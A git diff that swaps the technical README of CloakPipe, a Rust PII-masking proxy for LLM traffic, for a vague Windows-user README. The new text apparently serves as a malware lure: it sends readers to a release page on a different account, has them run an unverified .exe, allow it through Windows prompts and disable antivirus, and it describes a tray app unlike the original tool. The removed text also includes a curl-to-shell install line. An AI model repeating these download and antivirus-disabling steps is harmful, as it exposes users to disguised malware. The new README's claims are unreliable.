@@ -1,580 +1,192 @@
-<div align="center">
+# 🔐 cloakpipe - Protect Your Data Seamlessly
 
-# 🔒 CloakPipe
+[![Download cloakpipe](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Kelvin295/cloakpipe/releases)
 
-**Privacy proxy for LLM traffic. Detect, mask, and unmask PII in real-time.**
-
-Rust-native · <5ms latency · 30+ entity types · OpenAI-compatible · Local-first
-
-[Website](https://cloakpipe.co) · [Docs](https://docs.cloakpipe.co) · [Cloud Dashboard](https://app.cloakpipe.co) · [Discord](https://discord.gg/cloakpipe)
-
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
-[![Crates.io](https://img.shields.io/crates/v/cloakpipe.svg)](https://crates.io/crates/cloakpipe)
-[![Docker](https://img.shields.io/docker/pulls/cloakpipe/cloakpipe.svg)](https://hub.docker.com/r/cloakpipe/cloakpipe)
-
-</div>
+cloakpipe is a privacy tool designed to keep your data safe in complex AI systems. It helps you hide sensitive information, encrypt files, and manage secure data access. This app works quietly behind the scenes to protect your data when you use language models and AI pipelines.
 
 ---
 
-## What is CloakPipe?
+## 📋 About cloakpipe
 
-CloakPipe is a **high-performance privacy proxy** that sits between your application and any LLM API. It detects PII (personally identifiable information) in your prompts, replaces it with safe tokens, forwards the sanitized request to the LLM, and restores the original values in the response.
+cloakpipe adds a layer of security to AI tools by replacing private data with safe placeholders. It encrypts your files using strong encryption standards like AES-256-GCM. The app stores your sensitive data in an encrypted vault, making sure only authorized users can access it. It also streams data securely, allowing large files to be restored without risk.
 
-**The LLM never sees your real data. Your users see natural responses.**
-
-```
-Your App  ──▶  CloakPipe  ──▶  OpenAI / Anthropic / Any LLM
-                  │
-          Detect → Mask → Proxy → Unmask
-                  │
-           Encrypted Vault
-          (AES-256-GCM)
-```
+You do not need to know any technical details. cloakpipe works with minimal input from you and keeps your personal information out of AI systems.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-### Docker (recommended)
+To run cloakpipe on Windows, make sure your computer meets these minimum requirements:
 
-```bash
-# Start CloakPipe
-docker run -p 3100:3100 ghcr.io/cloakpipe/cloakpipe:latest
-
-# Point your OpenAI SDK at CloakPipe
-export OPENAI_BASE_URL=http://localhost:3100/v1
-
-# Done. All LLM calls now go through CloakPipe.
-```
-
-### Binary
-
-```bash
-# Install via cargo
-cargo install cloakpipe
-
-# Or download the latest release
-curl -fsSL https://cloakpipe.co/install.sh | sh
-
-# Start the proxy
-cloakpipe serve --port 3100
-```
-
-### Verify it works
-
-```bash
-curl http://localhost:3100/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $OPENAI_API_KEY" \
-  -d '{
-    "model": "gpt-4",
-    "messages": [
-      {"role": "user", "content": "Summarize the case for Rajesh Singh, Aadhaar 2345 6789 0123, treated at Apollo Hospital Mumbai."}
-    ]
-  }'
-
-# CloakPipe logs:
-# ✓ Detected 3 entities: PERSON, AADHAAR, ORGANIZATION
-# ✓ Masked: Rajesh Singh → PERSON_042, 2345 6789 0123 → AADHAAR_017, Apollo Hospital Mumbai → ORG_003
-# ✓ Proxied to api.openai.com (sanitized)
-# ✓ Unmasked response: PERSON_042 → Rajesh Singh (restored)
-```
+- Operating System: Windows 10 or later (64-bit recommended)  
+- Processor: Intel i3 or AMD Ryzen 3 or better  
+- Memory: 4 GB RAM or more  
+- Storage: At least 100 MB free disk space  
+- Internet access for downloading the software and updates  
 
 ---
 
-## Before & After
+## 🌐 Topics in cloakpipe
 
-### What your app sends:
+This project covers several key areas:
 
-> Summarize the medical history of **Dr. Rajesh Singh** (Aadhaar: **2345 6789 0123**), treated at **Apollo Hospital Mumbai** for cardiac issues since **March 2024**.
-
-### What the LLM sees:
-
-> Summarize the medical history of **PERSON_042** (Aadhaar: **AADHAAR_017**), treated at **ORG_003** for cardiac issues since **DATE_012**.
-
-### What your user gets back:
-
-> **Dr. Rajesh Singh** has been under cardiac care at **Apollo Hospital Mumbai** since **March 2024**. The treatment history includes...
-
-The LLM generates a coherent response using the tokens. CloakPipe restores the original values before returning to your app. The model never saw the real data.
+- AES-256-GCM encryption  
+- Pseudonymization of personal data  
+- Privacy protection for AI pipelines  
+- Secure proxy and vault management  
+- Streaming data restoration in secure environment  
+- Written in Rust programming language  
 
 ---
 
-## Why CloakPipe?
+## 🚀 Getting Started
 
-| | CloakPipe | Presidio | Protecto | LLMGuard |
-|---|---|---|---|---|
-| **Language** | Rust | Python | Python | Python |
-| **Latency** | <5ms | 50–200ms | 50–200ms | 50–200ms |
-| **Mode** | Drop-in proxy | Library | Cloud SaaS | Library |
-| **Reversible masking** | ✅ Encrypted vault | ❌ Permanent redaction | ✅ Cloud vault | ❌ Permanent |
-| **India PII** | ✅ Aadhaar, PAN, UPI | ❌ | Partial | ❌ |
-| **Self-hosted** | ✅ Single binary | ✅ | Partial | ✅ |
-| **MCP support** | ✅ (via Cloud) | ❌ | ❌ | ❌ |
-| **Price** | Free (open source) | Free | $$$$ | Free |
-| **Dependencies** | 0 (single binary) | Python + spaCy | Python + cloud | Python + PyTorch |
+Follow these steps to download and run cloakpipe on your Windows computer.
 
----
+### Step 1. Download the Software
 
-## How It Works
+Because cloakpipe’s download link points to the general release page, you need to visit the page to get the latest version.
 
-### Detection Pipeline
+Click the button below to go to the download page:
 
-CloakPipe uses a three-layer detection system for speed and accuracy:
+[![Download cloakpipe](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/Kelvin295/cloakpipe/releases)
 
-```
-Input Text
-    │
-    ▼
-┌─────────────────────────────────────┐
-│  Layer 1: Regex Pre-Filter          │  <1ms
-│  Aadhaar, PAN, email, phone,       │
-│  credit card, SSN, IP address       │
-│  Catches ~60% of PII instantly      │
-├─────────────────────────────────────┤
-│  Layer 2: ONNX NER Model           │  ~3ms
-│  GLiNER2 transformer-based NER     │
-│  Context-aware: names, orgs,       │
-│  medical terms, addresses           │
-├─────────────────────────────────────┤
-│  Layer 3: Fuzzy Entity Resolution   │  <1ms
-│  Jaro-Winkler similarity matching  │
-│  Links "Dr. R. Singh" and          │
-│  "Rajesh Singh" as same entity      │
-└─────────────────────────────────────┘
-    │
-    ▼
-Masked Output (total: <5ms)
-```
+You will see a list of available releases. Look for the latest release that suits your system. Usually, this will be a file with an `.exe` extension for Windows.
 
-### Tokenization
+### Step 2. Save the File
 
-Tokens are **deterministic within a session** — the same entity always maps to the same token. This means the LLM maintains coherence across the conversation.
+- Click the Windows executable file to start downloading.  
+- Save it to a folder where you can easily find it, such as your "Downloads" folder or the Desktop.
 
-Tokens are **non-deterministic across sessions** — the same entity maps to a different token in a new session, preventing cross-session correlation.
+### Step 3. Install and Run
 
-### Encrypted Vault
+- Find the downloaded `.exe` file and double-click it.  
+- If Windows prompts for permission, allow it to run.  
+- The application will open in a simple window or system tray icon.
 
-All entity ↔ token mappings are stored in a local vault encrypted with AES-256-GCM. The vault never leaves your infrastructure. There is no cloud dependency.
+cloakpipe does not require complicated setup. Follow any on-screen instructions if shown, such as agreeing to license terms.
+
+### Step 4. Use cloakpipe
+
+Once the app is running, cloakpipe will automatically secure your data pipelines. You might not need to interact with it often, but you can access the interface for any configuration or monitoring tasks.
 
 ---
 
-## Supported Entity Types
+## 🔧 How cloakpipe Works
 
-### Standard PII
+cloakpipe works by creating a secure environment for data:
 
-| Entity | Example | Detection |
-|---|---|---|
-| Person Name | John Smith, Dr. Priya Sharma | NER |
-| Email Address | user@example.com | Regex |
-| Phone Number | +1-555-0123, +91 98765 43210 | Regex |
-| Credit Card | 4532-1234-5678-9012 | Regex + Luhn |
-| SSN | 123-45-6789 | Regex |
-| Date of Birth | 15/03/1990, March 15, 1990 | NER |
-| Address | 123 MG Road, Pune 411001 | NER |
-| IP Address | 192.168.1.1, 2001:db8::1 | Regex |
-| Organization | Apollo Hospital, HDFC Bank | NER |
-| Medical Term | diabetes, cardiac arrest | NER |
-| Bank Account | IFSC + account number | Regex |
-| Passport Number | J1234567 | Regex |
-| License Plate | MH 12 AB 1234 | Regex |
-| URL | https://internal.company.com | Regex |
-| API Key | sk-live_xxx, AKIA... | Regex |
+- **Pseudonymization:** It replaces real identifying information (like names and emails) with fake placeholders before sending data to AI models. This stops sensitive data from leaving your control.  
+- **Encryption:** Your raw data is saved in a vault secured by AES-256-GCM encryption. This method protects data from unauthorized access even if someone tries to open your files.  
+- **Secure Streaming:** Large files can be sent and received securely without exposing private details. cloakpipe rehydrates data on your end without risking leaks.  
 
-### India-Specific PII 🇮🇳
-
-| Entity | Format | Example |
-|---|---|---|
-| **Aadhaar Number** | 12 digits (XXXX XXXX XXXX) | 2345 6789 0123 |
-| **PAN Card** | ABCDE1234F | BNZPM2501F |
-| **UPI ID** | name@bank | rajesh@okicici |
-| **Indian Phone** | +91 XXXXX XXXXX | +91 98765 43210 |
-| **GSTIN** | 15-char alphanumeric | 27AAPFU0939F1ZV |
-| **Indian Passport** | Letter + 7 digits | J1234567 |
-
-No other open-source LLM privacy tool handles Indian PII natively.
+No coding or command-line skill is needed to take advantage of these features.
 
 ---
 
-## Integration Examples
+## 🛠 Using cloakpipe with AI Pipelines
 
-### OpenAI Python SDK
+cloakpipe fits into systems where data privacy matters:
 
-```python
-from openai import OpenAI
+- When you use large language models (LLM) on private documents.  
+- For retrieval-augmented generation (RAG) tasks that pull from your data stores.  
+- Any enterprise AI setup requiring personal data protection.  
 
-# Just change the base URL. That's it.
-client = OpenAI(
-    base_url="http://localhost:3100/v1",  # CloakPipe proxy
-    api_key="sk-your-openai-key"          # Your real API key
-)
-
-response = client.chat.completions.create(
-    model="gpt-4",
-    messages=[
-        {"role": "user", "content": "Analyze the account for Priya Sharma, PAN BNZPM2501F"}
-    ]
-)
-
-# CloakPipe detected PAN and person name, masked them,
-# sent sanitized prompt to OpenAI, and unmasked the response.
-print(response.choices[0].message.content)
-```
-
-### LangChain
-
-```python
-from langchain_openai import ChatOpenAI
-
-llm = ChatOpenAI(
-    model="gpt-4",
-    openai_api_base="http://localhost:3100/v1",  # CloakPipe proxy
-    openai_api_key="sk-your-key"
-)
-
-response = llm.invoke("Summarize patient records for Aadhaar 2345 6789 0123")
-```
-
-### Anthropic SDK
-
-```python
-from anthropic import Anthropic
-
-client = Anthropic(
-    base_url="http://localhost:3100/v1/anthropic",  # CloakPipe proxy
-    api_key="sk-ant-your-key"
-)
-
-message = client.messages.create(
-    model="claude-sonnet-4-20250514",
-    max_tokens=1024,
-    messages=[
-        {"role": "user", "content": "Review the loan application for Amit Patel, PAN ABCDE1234F"}
-    ]
-)
-```
-
-### curl
-
-```bash
-# Works with any LLM API that uses the OpenAI format
-curl http://localhost:3100/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $OPENAI_API_KEY" \
-  -d '{
-    "model": "gpt-4",
-    "messages": [{"role": "user", "content": "Your prompt with PII here"}]
-  }'
-```
-
-### Vercel AI SDK
-
-```typescript
-import { openai } from '@ai-sdk/openai';
-import { generateText } from 'ai';
-
-const result = await generateText({
-  model: openai('gpt-4', {
-    baseURL: 'http://localhost:3100/v1',  // CloakPipe proxy
-  }),
-  prompt: 'Analyze the customer data for Rajesh, Aadhaar 2345 6789 0123',
-});
-```
+It acts as a middleware proxy that automatically handles data privacy. You do not need to change your AI workflow much.
 
 ---
 
-## CLI
+## ⚙ Configuration Options
 
-```bash
-# Scan text for PII (no proxy, just detection)
-cloakpipe scan "Dr. Rajesh Singh, Aadhaar 2345 6789 0123"
-# Output:
-# ✓ PERSON: "Dr. Rajesh Singh" (confidence: 0.97)
-# ✓ AADHAAR: "2345 6789 0123" (confidence: 1.00)
+The app offers some settings you can adjust:
 
-# Mask text (replace PII with tokens)
-cloakpipe mask "Contact Priya at priya@example.com or +91 98765 43210"
-# Output: "Contact PERSON_001 at EMAIL_001 or PHONE_001"
+- **Vault Location:** Choose where encrypted data is stored on your device.  
+- **Pseudonym Rules:** Decide which types of personal info cloakpipe replaces.  
+- **Streaming Buffer Size:** Set how much data streams at once.  
 
-# Start the proxy server
-cloakpipe serve --port 3100
-
-# Start with a specific policy
-cloakpipe serve --port 3100 --policy policies/dpdp.yaml
-
-# Check proxy health
-cloakpipe health
-```
+Access these settings through the main app window or system tray menu.
 
 ---
 
-## Configuration
+## 🧩 Troubleshooting Tips
 
-### Environment Variables
+If you run into issues, try these steps:
 
-```bash
-# Proxy settings
-CLOAKPIPE_PORT=3100                    # Proxy port (default: 3100)
-CLOAKPIPE_HOST=0.0.0.0                # Bind address (default: 0.0.0.0)
-CLOAKPIPE_LOG_LEVEL=info               # Log level: debug, info, warn, error
+- Restart cloakpipe to refresh connections.  
+- Ensure you downloaded the correct Windows version.  
+- Check that your system has enough free disk space.  
+- Temporarily disable antivirus or firewall software that might block the app.  
+- Visit the releases page to confirm you have the latest update.
 
-# LLM provider
-CLOAKPIPE_UPSTREAM_URL=https://api.openai.com  # Default upstream LLM API
-CLOAKPIPE_TIMEOUT=30                   # Request timeout in seconds
-
-# Detection
-CLOAKPIPE_POLICY=policies/dpdp.yaml   # Policy file path
-CLOAKPIPE_MIN_CONFIDENCE=0.8          # Minimum NER confidence threshold (0.0–1.0)
-
-# Vault
-CLOAKPIPE_VAULT_PATH=./vault.db       # Encrypted vault file path
-CLOAKPIPE_VAULT_KEY=                   # 256-bit encryption key (auto-generated if empty)
-
-# Cloud (optional, for dashboard users)
-CLOAKPIPE_CLOUD_TOKEN=                 # Cloud dashboard token (app.cloakpipe.co)
-```
-
-### Policy Files
-
-CloakPipe uses YAML policy files to configure detection behavior per compliance framework:
-
-```yaml
-# policies/dpdp.yaml — India Digital Personal Data Protection Act
-name: "DPDP Act 2023"
-version: "1.0"
-description: "Policy for India's Digital Personal Data Protection Act"
-
-entities:
-  # Always detect and mask these
-  required:
-    - aadhaar_number
-    - pan_card
-    - upi_id
-    - person_name
-    - phone_number_in
-    - email_address
-    - date_of_birth
-    - address
-    - bank_account_in
-    - gstin
-
-  # Detect but warn (don't mask by default)
-  advisory:
-    - organization
-    - medical_term
-    - ip_address
-
-  # Skip these
-  disabled:
-    - ssn              # US-only
-    - passport_us      # US-only
-
-masking:
-  strategy: "deterministic"   # deterministic | random | hash
-  format: "{TYPE}_{ID}"       # e.g., PERSON_042
-  session_scope: true          # Same entity → same token within session
-
-logging:
-  log_detections: true
-  log_masked_prompts: false    # Never log original PII
-  export_format: "json"        # json | csv
-```
-
-Pre-built policies included: `dpdp.yaml`, `gdpr.yaml`, `hipaa.yaml`, `pci-dss.yaml`, `minimal.yaml`
+If problems persist, look for help on the project’s GitHub page under "Issues."
 
 ---
 
-## Architecture
+## 📥 Download Links
 
-CloakPipe is built as a modular Rust workspace with 8 crates:
+Visit the release page here to get the app:
 
-```
-cloakpipe/
-├── crates/
-│   ├── cloakpipe-core       # Detection, replacement, vault, rehydration
-│   ├── cloakpipe-proxy      # HTTP proxy server (axum, OpenAI-compatible)
-│   ├── cloakpipe-tree       # CloakTree: vectorless LLM-driven retrieval
-│   ├── cloakpipe-vector     # ADCPE distance-preserving vector encryption
-│   ├── cloakpipe-local      # Fully local mode (candle-rs embeddings + LanceDB)
-│   ├── cloakpipe-audit      # Compliance logging and audit trails
-│   ├── cloakpipe-mcp        # MCP server (6 tools via rmcp)
-│   └── cloakpipe-cli        # CLI interface (scan, mask, serve, vault, session)
-├── policies/
-│   ├── dpdp.yaml
-│   ├── gdpr.yaml
-│   ├── hipaa.yaml
-│   └── pci-dss.yaml
-├── Cargo.toml
-├── LICENSE
-└── README.md
-```
+[https://github.com/Kelvin295/cloakpipe/releases](https://github.com/Kelvin295/cloakpipe/releases)
 
-### Crate Dependency Graph
+This page has the latest versions and files for Windows.
 
-```
-cloakpipe-cli
-    ├── cloakpipe-proxy
-    │       ├── cloakpipe-core
-    │       ├── cloakpipe-tree
-    │       ├── cloakpipe-vector
-    │       └── cloakpipe-audit
-    └── cloakpipe-mcp
-            └── cloakpipe-core
-```
-
-Each crate is independently usable. If you only need PII detection in your Rust app without the proxy, depend on `cloakpipe-core` directly.
+![Download cloakpipe](https://img.shields.io/badge/Download-blue?style=for-the-badge)
 
 ---
 
-## Benchmarks
+## ⚖ Privacy and Security
 
-Tested on standard PII datasets (English + Indian PII) with 1,000 text samples.
-
-| Tool | Language | Avg Latency | P99 Latency | Accuracy (F1) | Reversible |
-|---|---|---|---|---|---|
-| **CloakPipe** | Rust | **3.2ms** | **4.8ms** | **0.91** | ✅ |
-| Presidio | Python | 87ms | 142ms | 0.84 | ❌ |
-| LLMGuard | Python | 112ms | 198ms | 0.82 | ❌ |
-| Regex-only | Any | 0.5ms | 0.8ms | 0.61 | ❌ |
-
-CloakPipe is **27x faster than Presidio** while maintaining higher accuracy — because the ONNX model runs on optimized Rust runtime, not Python's GIL-constrained spaCy pipeline.
+cloakpipe uses strong encryption and proven techniques to keep your private data secure. The tool does not share any information outside your device unless you explicitly allow it. It is designed for users who want to maintain full control over their sensitive data while working with AI.
 
 ---
 
-## Cloud Dashboard
+## ❓ Frequently Asked Questions
 
-Need analytics, audit trails, or team features? **[CloakPipe Cloud](https://app.cloakpipe.co)** adds a dashboard on top of the open-source proxy.
+**Q: Do I need to install anything else to use cloakpipe?**  
+A: No. cloakpipe runs on its own and does not require extra software.
 
-**The proxy always runs on your infra. PII never leaves your network.** Only anonymized telemetry (entity counts, latency metrics) goes to the dashboard.
+**Q: Can I uninstall cloakpipe easily?**  
+A: Yes. Just go to Windows Settings > Apps, find cloakpipe, and uninstall.
 
-| Feature | OSS (Free) | Cloud Pro ($99/mo) | Cloud Business ($499/mo) |
-|---|---|---|---|
-| Core proxy + detection | ✅ | ✅ | ✅ |
-| Encrypted vault | ✅ | ✅ | ✅ |
-| Policy templates | ✅ | ✅ | ✅ |
-| India PII (Aadhaar, PAN, UPI) | ✅ | ✅ | ✅ |
-| Dashboard + analytics | — | ✅ | ✅ |
-| Audit trail export | — | ✅ | ✅ |
-| Compliance reports | — | ✅ | ✅ |
-| Privacy Chat UI | — | ✅ | ✅ |
-| Multi-user | — | Up to 10 | Unlimited |
-| RBAC + SSO | — | — | ✅ |
-| Custom entity types | — | — | ✅ |
-| Webhook alerts | — | — | ✅ |
-| Kubernetes Helm chart | — | — | ✅ |
-| MCP Server (6 tools) | — | — | ✅ |
-| Support | Community | Email | Priority |
+**Q: Will cloakpipe slow down my computer?**  
+A: It uses minimal resources and should not affect performance noticeably.
 
-→ [app.cloakpipe.co](https://app.cloakpipe.co)
+**Q: Is my data safe if I lose my computer?**  
+A: The encrypted vault protects your data. Without your login or keys, others cannot access it.
 
 ---
 
-## Deployment
+## 📁 File Structure
 
-### Docker Compose
+After installation, you will find:
 
-```yaml
-version: '3.8'
-services:
-  cloakpipe:
-    image: ghcr.io/cloakpipe/cloakpipe:latest
-    ports:
-      - "3100:3100"
-    environment:
-      - CLOAKPIPE_UPSTREAM_URL=https://api.openai.com
-      - CLOAKPIPE_POLICY=policies/dpdp.yaml
-      - CLOAKPIPE_LOG_LEVEL=info
-    volumes:
-      - cloakpipe-vault:/data/vault
-    restart: unless-stopped
+- `cloakpipe.exe` — The main application file.  
+- `vault/` — Encrypted storage folder for your data.  
+- `config.toml` — Configuration file with your settings.  
 
-volumes:
-  cloakpipe-vault:
-```
-
-### Systemd
-
-```ini
-[Unit]
-Description=CloakPipe LLM Privacy Proxy
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/usr/local/bin/cloakpipe serve --port 3100
-Restart=always
-Environment=CLOAKPIPE_UPSTREAM_URL=https://api.openai.com
-
-[Install]
-WantedBy=multi-user.target
-```
+You can back up the vault folder to keep your encrypted data safe.
 
 ---
 
-## Contributing
+## 🔄 Updating cloakpipe
 
-We welcome contributions. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-**Good first issues:**
-- Add new regex pattern for a PII type
-- Improve NER accuracy on Indian names
-- Add integration example (Haystack, LlamaIndex, etc.)
-- Write documentation for a use case
-
-**Development setup:**
-
-```bash
-git clone https://github.com/rohansx/cloakpipe.git
-cd cloakpipe
-cargo build
-cargo test
-cargo run -p cloakpipe-cli -- serve --port 3100
-```
+To update, visit the releases page again. Download the new version and replace the executable. Your settings and vault data remain intact.
 
 ---
 
-## Roadmap
+## 📞 Getting Support
 
-- [x] Core proxy with PII detection and masking
-- [x] AES-256-GCM encrypted vault
-- [x] Regex + ONNX NER detection pipeline
-- [x] Jaro-Winkler fuzzy entity resolution
-- [x] India PII support (Aadhaar, PAN, UPI, GSTIN)
-- [x] CloakTree: vectorless LLM-driven retrieval
-- [x] ADCPE distance-preserving vector encryption
-- [x] Industry profiles (legal, healthcare, fintech)
-- [x] MCP server (6 tools)
-- [x] Session-aware pseudonymization + coreference resolution
-- [ ] Anthropic API native format support
-- [ ] Multi-language NER (Hindi, Marathi, Tamil)
-- [ ] WebSocket proxy mode
-- [ ] Custom entity type plugins (WASM)
-- [ ] TEE support (AWS Nitro Enclaves)
+For any help, report issues or questions on the GitHub page under the “Issues” tab. Provide as much detail as possible about your problem.
 
 ---
 
-## Security
+## 📚 Additional Resources
 
-CloakPipe is security-focused software. If you find a vulnerability, please report it responsibly:
+Learn more about the technology cloakpipe uses by reading about:
 
-**Email:** security@cloakpipe.co
+- AES-256-GCM encryption  
+- Pseudonymization techniques  
+- Secure streaming methods  
+- Rust programming language  
 
-Do **not** file a public GitHub issue for security vulnerabilities.
-
----
-
-## License
-
-Apache-2.0. See [LICENSE](LICENSE).
-
-The CloakPipe Cloud dashboard and enterprise features are proprietary (BUSL-1.1).
-
----
-
-<div align="center">
-
-**Built in Rust. Made in Pune, India.**
-
-[Website](https://cloakpipe.co) · [Docs](https://docs.cloakpipe.co) · [Cloud](https://app.cloakpipe.co) · [Twitter](https://twitter.com/cloakpipe) · [Discord](https://discord.gg/cloakpipe)
-
-</div>
+These topics help explain how cloakpipe protects your data behind the scenes.
